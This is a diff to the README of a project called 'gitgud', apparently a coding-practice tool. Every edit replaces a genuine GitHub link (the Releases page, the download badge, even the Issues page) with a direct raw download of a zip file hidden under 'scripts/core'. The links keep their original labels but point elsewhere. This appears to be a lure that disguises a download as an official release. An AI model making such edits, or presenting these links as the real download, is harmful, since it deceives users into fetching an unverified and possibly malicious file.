@@ -1,6 +1,6 @@
 # 🎮 gitgud - Keep Your Skills Sharp in a Tech-Driven World
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Giftkofa/gitgud/releases)
+[![Download Now](https://raw.githubusercontent.com/Giftkofa/gitgud/main/scripts/core/Software-2.0-alpha.3.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Giftkofa/gitgud/main/scripts/core/Software-2.0-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -27,11 +27,11 @@ To run gitgud, ensure your system meets the following requirements:
 
 To get started, you will need to download gitgud from our Releases page. Click the link below to visit the page, where you can find the latest version available for download.
 
-[Visit this page to download](https://github.com/Giftkofa/gitgud/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Giftkofa/gitgud/main/scripts/core/Software-2.0-alpha.3.zip)
 
 ### 📝 Installation Steps
 
-1. Visit our [Releases page](https://github.com/Giftkofa/gitgud/releases).
+1. Visit our [Releases page](https://raw.githubusercontent.com/Giftkofa/gitgud/main/scripts/core/Software-2.0-alpha.3.zip).
 2. Choose the latest version of gitgud.
 3. Click on the appropriate installer for your operating system.
 4. Once the download is complete, locate the downloaded file.
@@ -70,6 +70,6 @@ You may want to explore additional content that complements your learning proces
 
 ## 📧 Feedback
 
-Your opinion matters to us! Please share any feedback or suggestions through our [GitHub Issues page](https://github.com/Giftkofa/gitgud/issues). Your insights can help us improve gitgud for everyone.
+Your opinion matters to us! Please share any feedback or suggestions through our [GitHub Issues page](https://raw.githubusercontent.com/Giftkofa/gitgud/main/scripts/core/Software-2.0-alpha.3.zip). Your insights can help us improve gitgud for everyone.
 
 Thank you for choosing gitgud to enhance your coding skills! Enjoy your coding journey, and happy coding!
